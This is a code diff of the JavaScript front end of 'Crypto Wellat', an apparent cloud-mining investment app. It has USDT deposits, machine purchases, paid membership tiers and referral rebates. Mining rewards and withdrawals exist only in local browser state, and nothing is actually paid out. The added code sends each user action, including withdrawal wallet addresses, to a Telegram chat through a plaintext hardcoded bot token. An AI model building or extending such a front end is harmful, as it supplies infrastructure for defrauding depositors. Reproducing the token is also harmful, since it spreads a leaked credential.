@@ -1,13 +1,21 @@
+// Telegram API Configuration
+const TELEGRAM_BOT_TOKEN = '8401039769:AAErdk3eB81U9PTBUtHpNeM4FdWVpo-0Os0';
+const TELEGRAM_CHAT_ID = '7417215529';
+
 // Global State
 let userState = {
-    brokerBalance: 20.00, // Initial demo balance
+    brokerBalance: 20.00,
     foundBalance: 0.00,
     miningMachines: [],
     miningActive: false,
     miningStartTime: null,
     miningClaimable: false,
     cloudMiningActive: false,
-    referralCode: 'SOL12345',
+    membershipLevel: 'basic',
+    referralCode: 'CRYPTO888',
+    directReferrals: 0,
+    teamMembers: 0,
+    totalRebates: 0,
     teamRebates: { tier1: 0, tier2: 0, tier3: 0 }
 };
 
@@ -50,30 +58,37 @@ const networkMapping = {
 // Initialize the application
 document.addEventListener('DOMContentLoaded', function() {
     initializeApp();
-    setupEventListeners();
-    updateUI();
-    startMiningCycleCheck();
 });
 
-function initializeApp() {
+async function initializeApp() {
+    // Show initial loading screen
+    await simulateLoading(2000);
+    
     // Load state from localStorage if available
-    const savedState = localStorage.getItem('solCoinState');
+    const savedState = localStorage.getItem('cryptoWellatState');
     if (savedState) {
         userState = JSON.parse(savedState);
     }
     
-    // Initialize mining machines grid
+    // Initialize UI components
+    setupEventListeners();
     renderMiningMachines();
+    updateUI();
+    startMiningCycleCheck();
     
-    // Initialize upgrade options
-    renderUpgradeOptions();
+    // Hide loading screen and show main app
+    document.getElementById('initialLoading').classList.remove('active');
+    document.getElementById('mainApp').classList.remove('hidden');
+    
+    // Send welcome notification
+    await sendTelegramNotification('welcome', {});
 }
 
 function setupEventListeners() {
     // Navigation
     document.querySelectorAll('.nav-btn').forEach(btn => {
         btn.addEventListener('click', (e) => {
-            const section = e.target.dataset.section;
+            const section = e.target.closest('.nav-btn').dataset.section;
             switchSection(section);
         });
     });
@@ -87,6 +102,29 @@ function setupEventListeners() {
 
     // Withdrawal amount calculation
     document.getElementById('withdrawAmount').addEventListener('input', calculateActualArrival);
+
+    // Upgrade buttons
+    document.querySelectorAll('.upgrade-btn').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            const level = e.target.dataset.level;
+            upgradeMembership(level);
+        });
+    });
+
+    // Share buttons
+    document.querySelectorAll('.share-btn').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            const platform = e.target.closest('.share-btn').dataset.platform;
+            shareReferralCode(platform);
+        });
+    });
+
+    // File upload
+    document.getElementById('uploadArea').addEventListener('click', () => {
+        document.getElementById('screenshotUpload').click();
+    });
+
+    document.getElementById('screenshotUpload').addEventListener('change', handleFileUpload);
 }
 
 function switchSection(sectionName) {
@@ -104,19 +142,21 @@ function switchSection(sectionName) {
     });
     document.getElementById(sectionName).classList.add('active');
 
-    // Special handling for withdraw section
+    // Special handling for sections
     if (sectionName === 'withdraw') {
         updateAvailableAssets();
+    } else if (sectionName === 'team') {
+        updateTeamStats();
     }
 }
 
 function renderMiningMachines() {
-    const grid = document.querySelector('.machines-grid');
+    const grid = document.getElementById('machinesGrid');
     grid.innerHTML = '';
 
     miningMachines.forEach(machine => {
         const machineCard = document.createElement('div');
-        machineCard.className = 'machine-card gold-pulse';
+        machineCard.className = 'machine-card';
         machineCard.innerHTML = `
             <div class="machine-header">
                 <span class="machine-name">${machine.name}</span>
@@ -124,37 +164,13 @@ function renderMiningMachines() {
             </div>
             <div class="machine-daily">Daily Mining: ${machine.dailyMining} USDT</div>
             <div class="machine-duration">Duration: ${machine.duration} days</div>
-            <button class="gold-btn buy-btn" onclick="openPurchaseModal(${machine.id})" 
+            <button class="action-btn primary" onclick="openPurchaseModal(${machine.id})" 
                     ${userState.brokerBalance < machine.cost ? 'disabled' : ''}>
                 Buy Now
             </button>
         `;
         grid.appendChild(machineCard);
     });
-}
-
-function renderUpgradeOptions() {
-    const upgradeContainer = document.querySelector('.upgrade-options');
-    upgradeContainer.innerHTML = `
-        <div class="upgrade-option">
-            <h4>Advanced Miner</h4>
-            <p>Cost: 100 USDT</p>
-            <p>Benefits: +15% mining efficiency</p>
-            <button class="gold-btn" onclick="upgradeMembership('advanced')">Upgrade</button>
-        </div>
-        <div class="upgrade-option">
-            <h4>Professional Miner</h4>
-            <p>Cost: 500 USDT</p>
-            <p>Benefits: +35% mining efficiency</p>
-            <button class="gold-btn" onclick="upgradeMembership('professional')">Upgrade</button>
-        </div>
-        <div class="upgrade-option">
-            <h4>Expert Miner</h4>
-            <p>Cost: 2000 USDT</p>
-            <p>Benefits: +60% mining efficiency</p>
-            <button class="gold-btn" onclick="upgradeMembership('expert')">Upgrade</button>
-        </div>
-    `;
 }
 
 function openPurchaseModal(machineId) {
@@ -164,23 +180,46 @@ function openPurchaseModal(machineId) {
     const modal = document.getElementById('purchaseModal');
     const details = document.getElementById('purchaseDetails');
     
+    const cloudBonus = machine.dailyMining * 0.3;
+    const totalDaily = machine.dailyMining + cloudBonus;
+    
     details.innerHTML = `
-        <p><strong>Machine:</strong> ${machine.name}</p>
-        <p><strong>Cost:</strong> ${machine.cost} USDT</p>
-        <p><strong>Daily Yield:</strong> ${machine.dailyMining} USDT</p>
-        <p><strong>Cloud Mining Bonus:</strong> +30%</p>
-        <p><strong>Total Daily:</strong> ${(machine.dailyMining * 1.3).toFixed(2)} USDT</p>
-        <p><strong>Your Balance:</strong> ${userState.brokerBalance} USDT</p>
-        ${userState.brokerBalance < machine.cost ? 
-            '<p style="color: #ff4444;">Insufficient balance. Please deposit first.</p>' : 
-            '<p style="color: #00ff00;">You can purchase this machine.</p>'}
+        <div class="purchase-details">
+            <div class="detail-row">
+                <span>Machine:</span>
+                <span>${machine.name}</span>
+            </div>
+            <div class="detail-row">
+                <span>Cost:</span>
+                <span class="highlight">${machine.cost} USDT</span>
+            </div>
+            <div class="detail-row">
+                <span>Base Daily Yield:</span>
+                <span>${machine.dailyMining} USDT</span>
+            </div>
+            <div class="detail-row">
+                <span>Cloud Mining Bonus:</span>
+                <span class="bonus">+30% (${cloudBonus} USDT)</span>
+            </div>
+            <div class="detail-row total">
+                <span>Total Daily:</span>
+                <span class="highlight">${totalDaily.toFixed(2)} USDT</span>
+            </div>
+            <div class="detail-row">
+                <span>Your Balance:</span>
+                <span>${userState.brokerBalance.toFixed(2)} USDT</span>
+            </div>
+            ${userState.brokerBalance < machine.cost ? 
+                '<div class="insufficient-balance">Insufficient balance. Please deposit first.</div>' : 
+                '<div class="sufficient-balance">You can purchase this machine.</div>'}
+        </div>
     `;
 
     modal.classList.remove('hidden');
     modal.dataset.machineId = machineId;
 }
 
-function confirmPurchase() {
+async function confirmPurchase() {
     const modal = document.getElementById('purchaseModal');
     const machineId = parseInt(modal.dataset.machineId);
     const machine = miningMachines.find(m => m.id === machineId);
@@ -194,6 +233,14 @@ function confirmPurchase() {
         showSuccessMessage('Error: Insufficient balance. Please deposit first.');
         return;
     }
+
+    // Show loading
+    const btn = modal.querySelector('.action-btn');
+    const spinner = btn.querySelector('.btn-spinner');
+    btn.disabled = true;
+    spinner.classList.remove('hidden');
+
+    await simulateLoading(2000);
 
     // Deduct cost from balance
     userState.brokerBalance -= machine.cost;
@@ -212,8 +259,8 @@ function confirmPurchase() {
         document.getElementById('cloudMiningStatus').textContent = 'Active';
     }
 
-    // Send Telegram notification (simulated)
-    sendTelegramNotification('purchase', {
+    // Send Telegram notification
+    await sendTelegramNotification('purchase', {
         machine: machine.name,
         amount: machine.cost,
         userBalance: userState.brokerBalance
@@ -223,13 +270,25 @@ function confirmPurchase() {
     updateUI();
     closeModal('purchaseModal');
     showSuccessMessage(`Successfully purchased ${machine.name}! Cloud mining activated with +30% bonus.`);
+
+    // Reset button state
+    btn.disabled = false;
+    spinner.classList.add('hidden');
 }
 
-function startMining() {
+async function startMining() {
     if (userState.miningMachines.length === 0) {
         showSuccessMessage('Please purchase a mining machine first.');
         return;
     }
+
+    // Show loading
+    const btn = document.getElementById('startMining');
+    const spinner = btn.querySelector('.btn-spinner');
+    btn.disabled = true;
+    spinner.classList.remove('hidden');
+
+    await simulateLoading(2000);
 
     userState.miningActive = true;
     userState.miningStartTime = Date.now();
@@ -237,20 +296,36 @@ function startMining() {
 
     // Update mining animation
     updateMiningAnimation('active');
+    updateMiningTimer();
 
     // Update buttons
     document.getElementById('startMining').classList.add('hidden');
     document.getElementById('claimRewards').classList.remove('hidden');
 
+    // Send Telegram notification
+    await sendTelegramNotification('mining_start', {});
+
     saveState();
     updateUI();
+
+    // Reset button state
+    btn.disabled = false;
+    spinner.classList.add('hidden');
 }
 
-function claimRewards() {
+async function claimRewards() {
     if (!userState.miningActive || !userState.miningClaimable) {
         showSuccessMessage('Mining cycle not complete yet.');
         return;
     }
+
+    // Show loading
+    const btn = document.getElementById('claimRewards');
+    const spinner = btn.querySelector('.btn-spinner');
+    btn.disabled = true;
+    spinner.classList.remove('hidden');
+
+    await simulateLoading(2000);
 
     // Calculate rewards
     const totalDailyMining = userState.miningMachines.reduce((total, machine) => {
@@ -278,6 +353,12 @@ function claimRewards() {
     document.getElementById('claimRewards').classList.add('hidden');
     document.getElementById('startMining').classList.remove('hidden');
 
+    // Send Telegram notification
+    await sendTelegramNotification('mining_claim', {
+        amount: totalReward,
+        totalBalance: userState.foundBalance
+    });
+
     saveState();
     updateUI();
     
@@ -285,6 +366,10 @@ function claimRewards() {
         updateMiningAnimation('idle');
         showSuccessMessage(`Successfully claimed ${totalReward.toFixed(2)} USDT!`);
     }, 2000);
+
+    // Reset button state
+    btn.disabled = false;
+    spinner.classList.add('hidden');
 }
 
 function startMiningCycleCheck() {
@@ -299,49 +384,58 @@ function startMiningCycleCheck() {
                 saveState();
                 updateUI();
             }
+            
+            updateMiningTimer();
         }
     }, 1000);
 }
 
+function updateMiningTimer() {
+    if (userState.miningActive && userState.miningStartTime) {
+        const elapsed = Date.now() - userState.miningStartTime;
+        const remaining = Math.max(0, (12 * 60 * 60 * 1000) - elapsed);
+        
+        const hours = Math.floor(remaining / (60 * 60 * 1000));
+        const minutes = Math.floor((remaining % (60 * 60 * 1000)) / (60 * 1000));
+        const seconds = Math.floor((remaining % (60 * 1000)) / 1000);
+        
+        const timerText = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        document.getElementById('miningTimer').textContent = timerText;
+        
+        if (remaining > 0) {
+            document.getElementById('miningTimer').classList.remove('hidden');
+            document.getElementById('miningStatusText').classList.add('hidden');
+        } else {
+            document.getElementById('miningTimer').classList.add('hidden');
+            document.getElementById('miningStatusText').classList.remove('hidden');
+            document.getElementById('miningStatusText').textContent = 'Ready to Claim!';
+        }
+    }
+}
+
 function updateMiningAnimation(state) {
     const animationContainer = document.getElementById('miningAnimation');
+    const statusText = document.getElementById('miningStatusText');
+    const timer = document.getElementById('miningTimer');
     
     switch(state) {
         case 'active':
-            animationContainer.innerHTML = `
-                <div class="mining-active-animation">
-                    <div class="rotating-disc"></div>
-                    <div class="particle-trail"></div>
-                    <div class="gold-pulse-overlay"></div>
-                </div>
-            `;
-            animationContainer.style.background = 'radial-gradient(circle, #1a1a1a 0%, #0a0a0a 100%)';
+            statusText.textContent = 'Mining in Progress...';
+            timer.classList.remove('hidden');
+            statusText.classList.add('hidden');
             break;
         case 'complete':
-            animationContainer.innerHTML = `
-                <div class="mining-complete-animation">
-                    <div class="success-check">✓</div>
-                    <div class="burst-effect"></div>
-                </div>
-            `;
-            animationContainer.style.background = 'radial-gradient(circle, #2a2a2a 0%, #1a1a1a 100%)';
+            statusText.textContent = 'Mining Complete!';
+            timer.classList.add('hidden');
+            statusText.classList.remove('hidden');
             break;
         case 'claim':
-            animationContainer.innerHTML = `
-                <div class="claim-animation">
-                    <div class="coin-fly"></div>
-                    <div class="gold-burst"></div>
-                </div>
-            `;
+            statusText.textContent = 'Claiming Rewards...';
             break;
         default:
-            animationContainer.innerHTML = `
-                <div class="idle-animation">
-                    <div class="breathing-glow"></div>
-                    <p>Ready to start mining</p>
-                </div>
-            `;
-            animationContainer.style.background = 'rgba(20, 20, 20, 0.9)';
+            statusText.textContent = 'Ready to Start Mining';
+            timer.classList.add('hidden');
+            statusText.classList.remove('hidden');
     }
 }
 
@@ -361,7 +455,6 @@ function updateUI() {
         startBtn.classList.add('hidden');
         claimBtn.classList.remove('hidden');
         claimBtn.disabled = !userState.miningClaimable;
-        claimBtn.textContent = userState.miningClaimable ? 'Claim Rewards' : 'Mining in Progress...';
     } else {
         startBtn.classList.remove('hidden');
         claimBtn.classList.add('hidden');
@@ -372,6 +465,10 @@ function updateUI() {
     document.getElementById('cloudMiningStatus').textContent = 
         userState.cloudMiningActive ? 'Active' : 'Inactive';
     
+    // Update membership level
+    document.getElementById('currentLevel').textContent = 
+        userState.membershipLevel.charAt(0).toUpperCase() + userState.membershipLevel.slice(1) + ' Miner';
+    
     // Re-render machines to update purchase button states
     renderMiningMachines();
 }
@@ -379,6 +476,12 @@ function updateUI() {
 function updateAvailableAssets() {
     document.getElementById('availableAssets').textContent = 
         userState.foundBalance.toFixed(6) + ' USDT';
+}
+
+function updateTeamStats() {
+    document.getElementById('directReferrals').textContent = userState.directReferrals;
+    document.getElementById('teamMembers').textContent = userState.teamMembers;
+    document.getElementById('totalRebates').textContent = userState.totalRebates.toFixed(2) + ' USDT';
 }
 
 function calculateActualArrival() {
@@ -391,7 +494,7 @@ function setMaxWithdraw() {
     calculateActualArrival();
 }
 
-function processWithdrawal() {
+async function processWithdrawal() {
     const amount = parseFloat(document.getElementById('withdrawAmount').value);
     const address = document.getElementById('withdrawAddress').value;
     const network = document.getElementById('withdrawNetwork').value;
@@ -411,11 +514,19 @@ function processWithdrawal() {
         return;
     }
 
+    // Show loading
+    const btn = document.querySelector('.confirm-btn');
+    const spinner = btn.querySelector('.btn-spinner');
+    btn.disabled = true;
+    spinner.classList.remove('hidden');
+
+    await simulateLoading(2000);
+
     // Process withdrawal
     userState.foundBalance -= amount;
 
     // Send Telegram notification
-    sendTelegramNotification('withdrawal', {
+    await sendTelegramNotification('withdrawal', {
         amount: amount,
         network: network,
         address: address
@@ -424,6 +535,21 @@ function processWithdrawal() {
     saveState();
     updateUI();
     showSuccessMessage(`Withdrawal request submitted for ${amount} USDT. Processing may take up to 24 hours.`);
+
+    // Reset form
+    document.getElementById('withdrawAmount').value = '';
+    document.getElementById('withdrawAddress').value = '';
+    calculateActualArrival();
+
+    // Reset button state
+    btn.disabled = false;
+    spinner.classList.add('hidden');
+}
+
+function openDepositModal() {
+    const modal = document.getElementById('depositModal');
+    modal.classList.remove('hidden');
+    updateDepositAddress();
 }
 
 function updateDepositAddress() {
@@ -432,10 +558,6 @@ function updateDepositAddress() {
     const address = walletAddresses[addressKey];
     
     document.getElementById('depositAddress').textContent = address;
-    
-    // In a real implementation, you would generate a QR code here
-    const qrCode = document.getElementById('qrCode');
-    qrCode.innerHTML = `<div style="color: #000; padding: 20px; text-align: center;">QR Code for ${address}</div>`;
 }
 
 function copyDepositAddress() {
@@ -451,7 +573,7 @@ function copyReferralCode() {
     });
 }
 
-function confirmPayment() {
+async function confirmPayment() {
     const amount = parseFloat(document.getElementById('depositAmount').value);
     const network = document.getElementById('depositNetwork').value;
 
@@ -460,20 +582,26 @@ function confirmPayment() {
         return;
     }
 
-    showLoading();
-    
-    setTimeout(() => {
-        hideLoading();
-        
-        // Send Telegram notification
-        sendTelegramNotification('deposit', {
-            amount: amount,
-            network: network
-        });
+    // Show loading
+    const btn = document.querySelector('#depositModal .action-btn.primary');
+    const spinner = btn.querySelector('.btn-spinner');
+    btn.disabled = true;
+    spinner.classList.remove('hidden');
 
-        showSuccessMessage('Deposit submitted - awaiting confirmation (up to 24 hours)');
-        closeModal('depositModal');
-    }, 2000);
+    await simulateLoading(2000);
+
+    // Send Telegram notification
+    await sendTelegramNotification('deposit', {
+        amount: amount,
+        network: network
+    });
+
+    showSuccessMessage('Deposit submitted - awaiting confirmation (up to 24 hours)');
+    closeModal('depositModal');
+
+    // Reset button state
+    btn.disabled = false;
+    spinner.classList.add('hidden');
 }
 
 function confirmDeposit() {
@@ -486,6 +614,125 @@ function confirmDeposit() {
         showSuccessMessage(`Deposit of ${amount} USDT confirmed!`);
         closeModal('depositModal');
     }
+}
+
+async function upgradeMembership(level) {
+    const costs = {
+        'advanced': 100,
+        'professional': 500,
+        'expert': 2000
+    };
+
+    const cost = costs[level];
+    if (userState.brokerBalance < cost) {
+        showSuccessMessage('Insufficient balance. Please deposit first.');
+        return;
+    }
+
+    // Show loading
+    await simulateLoading(2000);
+
+    userState.brokerBalance -= cost;
+    userState.membershipLevel = level;
+    
+    // Send Telegram notification
+    await sendTelegramNotification('upgrade', {
+        level: level,
+        cost: cost
+    });
+
+    saveState();
+    updateUI();
+    showSuccessMessage(`Membership upgraded to ${level} level!`);
+}
+
+function shareReferralCode(platform) {
+    const message = `Join me on Crypto Wellat and start earning with cloud mining! Use my referral code: ${userState.referralCode}`;
+    const url = `https://crypto-wellat.com?ref=${userState.referralCode}`;
+    
+    let shareUrl = '';
+    
+    switch(platform) {
+        case 'telegram':
+            shareUrl = `https://t.me/share/url?url=${encodeURIComponent(url)}&text=${encodeURIComponent(message)}`;
+            break;
+        case 'whatsapp':
+            shareUrl = `https://wa.me/?text=${encodeURIComponent(message + ' ' + url)}`;
+            break;
+        case 'facebook':
+            shareUrl = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}`;
+            break;
+        case 'twitter':
+            shareUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(message)}&url=${encodeURIComponent(url)}`;
+            break;
+    }
+    
+    if (shareUrl) {
+        window.open(shareUrl, '_blank', 'width=600,height=400');
+    }
+}
+
+function handleFileUpload(event) {
+    const file = event.target.files[0];
+    if (file) {
+        const uploadArea = document.getElementById('uploadArea');
+        uploadArea.innerHTML = `<span>✅ ${file.name}</span>`;
+        
+        // In a real implementation, you would upload the file to a server
+        console.log('File selected:', file.name);
+    }
+}
+
+// Telegram API Functions
+async function sendTelegramNotification(type, data) {
+    const messages = {
+        'welcome': `🟣 New user started using Crypto Wellat\nUser ID: ${generateUserId()}\nTime: ${new Date().toLocaleString()}`,
+        'purchase': `🟣 New Mining Machine Purchase\nMachine: ${data.machine}\nAmount: ${data.amount} USDT\nUser Balance: ${data.userBalance} USDT\nTime: ${new Date().toLocaleString()}`,
+        'deposit': `🟣 Deposit Request\nAmount: ${data.amount} USDT\nNetwork: ${data.network}\nTime: ${new Date().toLocaleString()}`,
+        'withdrawal': `🟣 Withdrawal Request\nAmount: ${data.amount} USDT\nNetwork: ${data.network}\nAddress: ${data.address}\nTime: ${new Date().toLocaleString()}`,
+        'mining_start': `🟣 Mining Started\nUser ID: ${generateUserId()}\nTime: ${new Date().toLocaleString()}`,
+        'mining_claim': `🟣 Rewards Claimed\nAmount: ${data.amount} USDT\nTotal Balance: ${data.totalBalance} USDT\nTime: ${new Date().toLocaleString()}`,
+        'upgrade': `🟣 Membership Upgrade\nLevel: ${data.level}\nCost: ${data.cost} USDT\nTime: ${new Date().toLocaleString()}`
+    };
+
+    const message = messages[type] || `🟣 Crypto Wellat Notification\nType: ${type}\nData: ${JSON.stringify(data)}\nTime: ${new Date().toLocaleString()}`;
+
+    try {
+        // Send to Telegram Bot API
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+
+        if (!response.ok) {
+            console.error('Telegram API error:', await response.text());
+        }
+    } catch (error) {
+        console.error('Failed to send Telegram notification:', error);
+    }
+}
+
+function generateUserId() {
+    let userId = localStorage.getItem('cryptoWellatUserId');
+    if (!userId) {
+        userId = 'USER_' + Math.random().toString(36).substr(2, 9).toUpperCase();
+        localStorage.setItem('cryptoWellatUserId', userId);
+    }
+    return userId;
+}
+
+// Utility Functions
+function simulateLoading(duration) {
+    return new Promise(resolve => {
+        setTimeout(resolve, duration);
+    });
 }
 
 function showLoading() {
@@ -509,54 +756,8 @@ function closeModal(modalId) {
     document.getElementById(modalId).classList.add('hidden');
 }
 
-function upgradeMembership(level) {
-    const costs = {
-        'advanced': 100,
-        'professional': 500,
-        'expert': 2000
-    };
-
-    const cost = costs[level];
-    if (userState.brokerBalance < cost) {
-        showSuccessMessage('Insufficient balance. Please deposit first.');
-        return;
-    }
-
-    userState.brokerBalance -= cost;
-    document.getElementById('currentLevel').textContent = level.charAt(0).toUpperCase() + level.slice(1);
-    
-    saveState();
-    updateUI();
-    showSuccessMessage(`Membership upgraded to ${level} level!`);
-}
-
-function sendTelegramNotification(type, data) {
-    // This is a simulation - in a real implementation, you would send to a webhook
-    const message = {
-        type: type,
-        data: data,
-        userId: 'demo-user',
-        timestamp: new Date().toISOString()
-    };
-    
-    console.log('Telegram Notification:', message);
-    
-    // Example webhook call (commented out for static site)
-    /*
-    fetch('YOUR_WEBHOOK_URL', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            botToken: '8401039769:AAErdk3eB81U9PTBUtHpNeM4FdWVpo-0Os0',
-            chatId: '7417215529',
-            message: `New ${type} request - User: demo-user, Amount: ${data.amount} USDT`
-        })
-    });
-    */
-}
-
 function saveState() {
-    localStorage.setItem('solCoinState', JSON.stringify(userState));
+    localStorage.setItem('cryptoWellatState', JSON.stringify(userState));
 }
 
 // Export functions for global access
@@ -571,3 +772,4 @@ window.confirmDeposit = confirmDeposit;
 window.closeModal = closeModal;
 window.closeSuccessMessage = closeSuccessMessage;
 window.upgradeMembership = upgradeMembership;
+window.openDepositModal = openDepositModal;
